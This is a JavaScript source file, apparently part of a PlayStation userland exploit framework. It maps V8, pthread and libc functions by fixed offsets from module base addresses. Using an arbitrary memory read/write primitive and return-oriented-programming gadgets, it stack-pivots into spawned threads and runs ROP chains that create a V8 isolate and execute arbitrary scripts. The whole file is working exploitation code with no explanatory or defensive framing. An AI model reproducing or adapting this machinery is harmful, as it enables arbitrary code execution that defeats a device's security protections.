fn.v8_ArrayBuffer_Allocator_NewDefaultAllocator = new NativeFunction(eboot_base + 0xe66b70n, "bigint");
fn.v8_internal_Isolate_New = new NativeFunction(eboot_base + 0xe6c6c0n, "bigint");
fn.v8_internal_Isolate_Dispose = new NativeFunction(eboot_base + 0xe39aa0n);
fn.v8_Isolate_Scope_Ctor = new NativeFunction(eboot_base + 0xe397e0n);
fn.v8_Isolate_Scope_Dtor = new NativeFunction(eboot_base + 0xe39a90n);
fn.v8_HandleScope_Ctor = new NativeFunction(eboot_base + 0xe3b510n);
fn.v8_HandleScope_Dtor = new NativeFunction(eboot_base + 0xe3b5e0n);
fn.v8_TryCatch_Ctor = new NativeFunction(eboot_base + 0xe45060n);
fn.v8_TryCatch_Dtor = new NativeFunction(eboot_base + 0xe450d0n);
fn.v8_TryCatch_Exception = new NativeFunction(eboot_base + 0xe45320n, "bigint");
fn.v8_Context_Scope_Ctor = new NativeFunction(eboot_base + 0xe3b970n);
fn.v8_Context_Scope_Dtor = new NativeFunction(eboot_base + 0xe3bd10n);
fn.v8_Context_New = new NativeFunction(eboot_base + 0xe5c7e0n, "bigint");
fn.v8_String_NewFromUtf8 = new NativeFunction(eboot_base + 0xe5ea70n, "bigint");
fn.v8_String_Utf8Value = new NativeFunction(eboot_base + 0xe6e1f0n);
fn.v8_Script_Compile = new NativeFunction(eboot_base + 0xe44fd0n, "bigint");
fn.v8_Script_Run = new NativeFunction(eboot_base + 0xe40cf0n, "bigint");

fn.pthread_attr_destroy = new NativeFunction(eboot_base + 0x215df40n, "number");
fn.pthread_attr_init = new NativeFunction(eboot_base + 0x215ded0n, "number");
fn.pthread_attr_setdetachstate = new NativeFunction(eboot_base + 0x215dee0n, "number");
fn.pthread_attr_setinheritsched = new NativeFunction(eboot_base + 0x215df20n, "number");
fn.pthread_attr_setschedparam = new NativeFunction(eboot_base + 0x215df10n, "number");
fn.pthread_attr_setstacksize = new NativeFunction(eboot_base + 0x215def0n, "number");
fn.scePthreadAttrSetaffinity = new NativeFunction(eboot_base + 0x215df00n, "number");
fn.scePthreadAttrGet = new NativeFunction(libc_base + 0xccb70n, "number");
fn.pthread_cond_broadcast = new NativeFunction(eboot_base + 0x215e160n, "number");
fn.pthread_cond_destroy = new NativeFunction(eboot_base + 0x215e1b0n, "number");
fn.pthread_cond_init = new NativeFunction(eboot_base + 0x215e190n, "number");
fn.pthread_cond_signal = new NativeFunction(eboot_base + 0x215e1c0n, "number");
fn.pthread_cond_wait = new NativeFunction(eboot_base + 0x215e1d0n, "number");
fn.pthread_create = new NativeFunction(eboot_base + 0x215df30n, "number");
fn.pthread_detach = new NativeFunction(eboot_base + 0x215e270n, "number");
fn.pthread_equal = new NativeFunction(eboot_base + 0x215e750n, "number");
fn.pthread_getspecific = new NativeFunction(eboot_base + 0x215e280n, "number");
fn.pthread_join = new NativeFunction(eboot_base + 0x215e290n, "number");
fn.pthread_mutex_destroy = new NativeFunction(eboot_base + 0x215e220n, "number");
fn.pthread_mutex_init = new NativeFunction(eboot_base + 0x215e210n, "number");
fn.pthread_mutex_lock = new NativeFunction(eboot_base + 0x215e1f0n, "number");
fn.pthread_mutex_unlock = new NativeFunction(eboot_base + 0x215e230n, "number");
fn.pthread_self = new NativeFunction(eboot_base + 0x215df60n, "number");
fn.pthread_rename_np = new NativeFunction(eboot_base + 0x215df70n, "number");

fn.strndup = new NativeFunction(libc_base + 0x747c0n, "bigint");
fn.calloc = new NativeFunction(libc_base + 0x5c40n, "bigint");
fn.free = new NativeFunction(libc_base + 0x5c30n);

fn.sched_yield = new NativeFunction(0x14b, "number");

let detach_flag = false;

class Thread {
  /**
   * @param {string} name
   * @param {number} stack_size
   */
  constructor(name, stack_size) {
    if (stack_size < 0x4000) {
      throw new Error("Invalid stack size, minimal thread stack size is 0x4000");
    }

    this.name = name;
    this.running = false;
    this.stack_size = stack_size;
    this.mutex_addr = mem.alloc(8);
    this.cond_addr = mem.alloc(8);
    this.attr_addr = mem.alloc(8);
    this.pivot_frame = new Frame(["rsp"]);
    this.pivot_stack = new Stack(0x1000);

    this.pivot_insts = [];
    this.pivot_insts.push(gadgets.POP_R15_RET);
    this.pivot_insts.push(gadgets.XCHG_RSP_RAX_RET);
    this.pivot_frame.store(this.pivot_insts, "rsp");

    fn.pthread_mutex_lock.chain(this.pivot_insts, this.mutex_addr);
    fn.pthread_cond_wait.chain(this.pivot_insts, this.cond_addr, this.mutex_addr);
    fn.pthread_mutex_unlock.chain(this.pivot_insts, this.mutex_addr);

    this.pivot_frame.load(this.pivot_insts, "rsp");
    this.pivot_insts.push(gadgets.XCHG_RSP_RAX_RET);
  }

  free() {
    mem.free(this.mutex_addr);
    mem.free(this.cond_addr);
    mem.free(this.attr_addr);

    this.pivot_frame.free();
    this.pivot_stack.free();
  }

  spawn() {
    if (this.running) {
      log(`Thread ${this.name} already running !!`);
      return;
    }

    if (fn.pthread_mutex_init.invoke(this.mutex_addr, 0)) {
      throw new Error("Unable to create mutex !!");
    }

    if (fn.pthread_cond_init.invoke(this.cond_addr, 0)) {
      throw new Error("Unable to create cond !!");
    }

    if (fn.pthread_attr_init.invoke(this.attr_addr)) {
      throw new Error("Unable to create attr !!");
    }

    if (fn.pthread_attr_setstacksize.invoke(this.attr_addr, this.stack_size)) {
      throw new Error("Unable to set stack size !!");
    }

    this.pivot_stack.prepare(this.pivot_insts, this.pivot_frame);

    const pthread_addr_addr = mem.alloc(8);
    const pivot_stack_sp_addr = mem.alloc(8);

    const current_sp = this.pivot_stack.sp;
    arw.view(pivot_stack_sp_addr).setBigUint64(0, current_sp, true);

    if (fn.pthread_create.invoke(pthread_addr_addr, this.attr_addr, gadgets.MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8, pivot_stack_sp_addr)) {
      throw new Error(`Unable to create thread ${this.name} !!`);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    this.pthread_addr = arw.view(pthread_addr_addr).getBigUint64(0, true);
    this.pthread_id = arw.view(this.pthread_addr).getBigUint64(0, true);

    mem.free(pivot_stack_sp_addr);
    mem.free(pthread_addr_addr);

    if (fn.pthread_rename_np.invoke(this.pthread_addr, this.name)) {
      throw new Error(`Unable to set name for thread ${this.pthread_id} !!`);
    }

    if (fn.scePthreadAttrGet.invoke(this.pthread_addr, this.attr_addr)) {
      throw new Error(`Unable to get attr from thread ${this.pthread_id} !!`);
    }

    if (this.attr_addr === 0n) {
      throw new Error(`Empty attr from thread ${this.pthread_id} !!`);
    }

    const pthread_attr = arw.view(this.attr_addr).getBigUint64(0, true);

    this.pthread_stack_addr = arw.view(pthread_attr).getBigUint64(0x18, true);
    this.pthread_stack_size = arw.view(pthread_attr).getBigUint64(0x20, true);

    this.running = true;
  }

  /** @param {Stack} stack */
  inject(stack) {
    const pthread_sp = this.pthread_stack_addr + (this.pthread_stack_size - 0x38n);
    const copy_size = stack.view.byteLength - stack.offset;
    const new_sp = pthread_sp - copy_size.bigint();

    mem.copy(new_sp, stack.sp, copy_size);

    this.pivot_frame.set_value("rsp", new_sp);
  }

  resume() {
    if (fn.pthread_mutex_lock.invoke(this.mutex_addr)) {
      throw new Error(`Unable to lock mutex ${this.mutex_addr} !!`);
    }

    if (fn.pthread_cond_signal.invoke(this.cond_addr)) {
      throw new Error(`Unable to signal cond ${this.cond_addr} !!`);
    }

    if (fn.pthread_mutex_unlock.invoke(this.mutex_addr)) {
      throw new Error(`Unable to unlock mutex ${this.mutex_addr} !!`);
    }
  }

  join() {
    logger?.debug(`wait for ${this.name} to join...`);

    if (fn.pthread_join.invoke(this.pthread_addr, 0)) {
      throw new Error(`Unable to join thread ${this.name} !!`);
    }

    logger?.debug(`${this.name} returned !!`);

    this.running = false;

    this.pivot_frame.reset();
    this.pivot_stack.reset();

    if (fn.pthread_mutex_destroy.invoke(this.mutex_addr)) {
      throw new Error(`Unable to destroy mutex ${this.mutex_addr} !!`);
    }

    if (fn.pthread_cond_destroy.invoke(this.cond_addr)) {
      throw new Error(`Unable to destroy cond ${this.cond_addr} !!`);
    }

    if (fn.pthread_attr_destroy.invoke(this.attr_addr)) {
      throw new Error(`Unable to destroy attr ${this.attr_addr} !!`);
    }
  }
}

class JSThread extends Thread {
  /**
   * @param {string} name
   * @param {number} stack_size
   */
  constructor(name, script) {
    super(name, 0x8000);

    this.script = script;
    this.js_frame = new Frame(["script_cstr", "create_params", "array_buffer_allocator", "isolate", "handle_scope", "try_catch", "context", "source", "script", "ret", "exception", "utf8", "utf8_ptr", "utf8_len", "ret_cstr", "exception_cstr"]);
    this.js_stack = new Stack(0x1000);

    this.js_insts = [];
    fn.calloc.chain(this.js_insts, 0x15, 8); // sizeof(v8::Isolate::CreateParams) = 0xA8
    this.js_frame.store(this.js_insts, "create_params");

    this.js_insts.push(fn.v8_ArrayBuffer_Allocator_NewDefaultAllocator.addr);
    this.js_frame.store(this.js_insts, "array_buffer_allocator");

    this.js_insts.push(gadgets.XCHG_RSI_RAX_RET);
    this.js_frame.load(this.js_insts, "create_params");
    this.js_insts.push(gadgets.MOV_QWORD_PTR_RAX_60_RSI_RET); // offsetof(v8::Isolate::CreateParams, array_buffer_allocator) = 0x60

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "create_params");
    this.js_insts.push(fn.v8_internal_Isolate_New.addr);
    this.js_frame.store(this.js_insts, "isolate");

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "isolate");
    this.js_insts.push(fn.v8_Isolate_Scope_Ctor.addr);

    fn.calloc.chain(this.js_insts, 3, 8); // sizeof(v8::HandleScope) = 0x18
    this.js_frame.store(this.js_insts, "handle_scope");

    this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "isolate");
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "handle_scope");
    this.js_insts.push(fn.v8_HandleScope_Ctor.addr);

    this.js_insts.push(gadgets.POP_R9_RET);
    this.js_insts.push(0n);
    this.js_insts.push(gadgets.POP_R8_RET);
    this.js_insts.push(0n);
    this.js_insts.push(gadgets.POP_RCX_RET);
    this.js_insts.push(0n);
    this.js_insts.push(gadgets.POP_RDX_RET);
    this.js_insts.push(0n);
    this.js_insts.push(gadgets.POP_RSI_RET);
    this.js_insts.push(0n);
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "isolate");
    this.js_insts.push(fn.v8_Context_New.addr);
    this.js_insts.push(gadgets.POP_R9_RET); // filler to chain ROP
    this.js_insts.push(0n); // pass a7
    this.js_frame.store(this.js_insts, "context");

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "context");
    this.js_insts.push(fn.v8_Context_Scope_Ctor.addr);

    fn.calloc.chain(this.js_insts, 6, 8); // sizeof(v8::TryCatch) = 0x30
    this.js_frame.store(this.js_insts, "try_catch");

    this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "isolate");
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "try_catch");
    this.js_insts.push(fn.v8_TryCatch_Ctor.addr);

    this.js_insts.push(gadgets.POP_RCX_RET);
    this.js_insts.push(-1n);
    this.js_insts.push(gadgets.POP_RDX_RET);
    this.js_insts.push(0n);
    this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "script_cstr");
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "isolate");
    this.js_insts.push(fn.v8_String_NewFromUtf8.addr);
    this.js_frame.store(this.js_insts, "source");

    this.js_insts.push(gadgets.POP_RDX_RET);
    this.js_insts.push(0n);
    this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "source");
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "context");
    this.js_insts.push(fn.v8_Script_Compile.addr);
    this.js_frame.store(this.js_insts, "script");

    this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "context");
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "script");
    this.js_insts.push(fn.v8_Script_Run.addr);
    this.js_frame.store(this.js_insts, "ret");

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "try_catch");
    this.js_insts.push(fn.v8_TryCatch_Exception.addr);
    this.js_frame.store(this.js_insts, "exception");

    // return and exception strings
    for (const name of ["ret", "exception"]) {
      fn.calloc.chain(this.js_insts, 2, 8); // sizeof(v8::String::Utf8Value) = 0x10
      this.js_frame.store(this.js_insts, "utf8");

      this.js_frame.pop(this.js_insts, gadgets.POP_RDX_RET, name);
      this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "isolate");
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "utf8");
      this.js_insts.push(fn.v8_String_Utf8Value.addr);

      this.js_frame.load(this.js_insts, "utf8");
      this.js_insts.push(gadgets.MOV_RAX_QWORD_PTR_RAX_RET);
      this.js_frame.store(this.js_insts, "utf8_ptr");

      this.js_frame.load(this.js_insts, "utf8");
      this.js_insts.push(gadgets.MOV_RAX_QWORD_PTR_RAX_8_RET);
      this.js_frame.store(this.js_insts, "utf8_len");

      this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "utf8_len");
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "utf8_ptr");
      this.js_insts.push(fn.strndup.addr);
      this.js_frame.store(this.js_insts, `${name}_cstr`);

      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "utf8");
      this.js_insts.push(fn.free.addr);
    }

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "try_catch");
    this.js_insts.push(fn.v8_TryCatch_Dtor.addr);

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "context");
    this.js_insts.push(fn.v8_Context_Scope_Dtor.addr);

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "handle_scope");
    this.js_insts.push(fn.v8_HandleScope_Dtor.addr);

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "isolate");
    this.js_insts.push(fn.v8_Isolate_Scope_Dtor.addr);

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "isolate");
    this.js_insts.push(fn.v8_internal_Isolate_Dispose.addr);

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "try_catch");
    this.js_insts.push(fn.free.addr);

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "handle_scope");
    this.js_insts.push(fn.free.addr);

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "create_params");
    this.js_insts.push(fn.free.addr);
  }

  execute() {
    super.spawn();

    this.js_frame.set_value("script_cstr", this.script.cstr());
    this.js_stack.prepare(this.js_insts, this.js_frame);

    super.inject(this.js_stack);

    super.resume();
  }

  spawn() {
    throw new Error("Not implemented !!");
  }

  /** @param {Stack} stack */
  inject(stack) {
    throw new Error("Not implemented !!");
  }

  resume(stack) {
    throw new Error("Not implemented !!");
  }

  join() {
    super.join();

    const script_cstr = this.js_frame.get_value("script_cstr");
    mem.free(script_cstr);

    const exception_cstr = this.js_frame.get_value("exception_cstr");
    const ret_cstr = this.js_frame.get_value("ret_cstr");

    this.exception = String.from(exception_cstr);
    this.ret = String.from(ret_cstr);

    logger?.debug(`exception: ${this.exception}`);
    logger?.debug(`return: ${this.ret}`);

    fn.free.invoke(exception_cstr);
    fn.free.invoke(ret_cstr);

    this.js_frame.reset();
    this.js_stack.reset();
  }
}
